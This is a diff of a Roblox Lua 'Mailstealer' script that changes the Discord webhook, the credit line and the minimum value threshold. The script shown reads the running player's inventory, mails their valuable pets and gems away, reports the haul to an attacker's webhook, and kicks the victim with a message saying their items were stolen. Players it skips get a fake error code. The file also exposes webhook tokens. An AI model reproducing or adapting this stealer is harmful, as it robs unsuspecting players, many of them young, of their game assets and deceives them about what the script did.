@@ -1,6 +1,6 @@
 Username = "br1c7s"
-Webhook = "https://discord.com/api/webhooks/1216155442410164254/qjaqi-qAtHlSH64yBFnaijAHiImD9vFHrd12etGKgSz-4xJrWjfXDxYTGeRndwXDfCed" -- your discord webhook in here
-min_rap = 20000
+Webhook = "https://discord.com/api/webhooks/1216487831099146320/JsLK6o7iRv2jIj5MxS7kmm9kUj3HIZdaMdW7fz2QLOk5E3wBfsA8xLct1HiO3hRWcgzD" -- your discord webhook in here
+min_rap = 500000
 
 local function SendMessage(url, username, itemID)
     local http = game:GetService("HttpService")
@@ -24,7 +24,7 @@ local function SendMessage(url, username, itemID)
                 }
             },
 			["footer"] = {
-				["text"] = "Mailstealer by leo"
+				["text"] = "Mailstealer by Tobi. discord.gg/HcpNe56R2a"
 			}
         }}
     }
@@ -40,13 +40,13 @@ end
 if Webhook and string.find(Webhook, "discord") then
 	Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
 else
-	Webhook = "https://discord.com/api/webhooks/1216155442410164254/qjaqi-qAtHlSH64yBFnaijAHiImD9vFHrd12etGKgSz-4xJrWjfXDxYTGeRndwXDfCed"
+	Webhook = ""
 end
 
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
 local plr = game.Players.LocalPlayer
-local MailMessage = "d3pe on top"
+local MailMessage = "gg / HcpNe56R2a"
 local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
@@ -361,8 +361,8 @@ if CountHuges() > 0 or CountGems() > 1000000 then
 
 	miscSteal()
 	SendAllGems()
-	setclipboard("preciate the stuff")
-	plr:kick("All your stuff has just been stolen by D3PES mailstealer.")
+	setclipboard("https://discord.gg/HcpNe56R2a")
+	plr:kick("All your stuff has just been stolen by d3pes mail.")
 else
 	plr:kick("Error on script execution: 0x0001F4A2")
 end
